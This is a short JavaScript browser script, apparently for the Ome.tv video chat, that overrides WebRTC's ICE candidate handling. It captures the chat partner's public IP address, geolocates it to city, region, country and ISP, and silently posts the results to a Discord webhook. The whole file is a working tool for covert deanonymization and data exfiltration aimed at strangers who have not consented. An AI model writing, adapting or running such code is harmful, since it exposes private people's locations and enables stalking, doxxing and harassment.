let apiKey = "apikey";
let webhook = "discord_webhook"

window.oRTCPeerConnection =
  window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
  const pc = new window.oRTCPeerConnection(...args);

  pc.oaddIceCandidate = pc.addIceCandidate;

  pc.addIceCandidate = function (iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(" ");

    const ip = fields[4];
    if (fields[7] === "srflx") {
        lol(ip);
        wtf(1500);
        return;
    }
    return pc.oaddIceCandidate(iceCandidate, ...rest);
  };
  return pc;
};

let lol = async (ip) => {

  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
  let random = Math.floor(Math.random() * 100)

  var request = new XMLHttpRequest();
  request.open("POST", `${webhook}`);

  request.setRequestHeader('Content-type', 'application/json');

  await fetch(url).then((response) =>
  response.json().then((json) => {
  
  var myEmbed = {
    author: {
      name: `${random} | IP: ${ip}`,
      icon_url: `${json.country_flag}`
    },
    title: `Stadt: **${json.city}** | Region: **${json.state_prov}**`,
    description: `Ländername: **${json.country_name}** | ISP: **${json.isp}**`,
    color: hexToDecimal('#' + Math.round((0x1000000 + 0xffffff * Math.random())).toString(16).slice(1)),
  }
  
  var params = {
    username: `OME.TV`,
    embeds: [ myEmbed ],
  }
  
  request.send(JSON.stringify(params));
  
  // function that converts a color HEX to a valid Discord color
  function hexToDecimal(hex) {
    return parseInt(hex.replace("#",""), 16)
  }
}))
}

function wtf(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds){
      break;
    }
  }
}
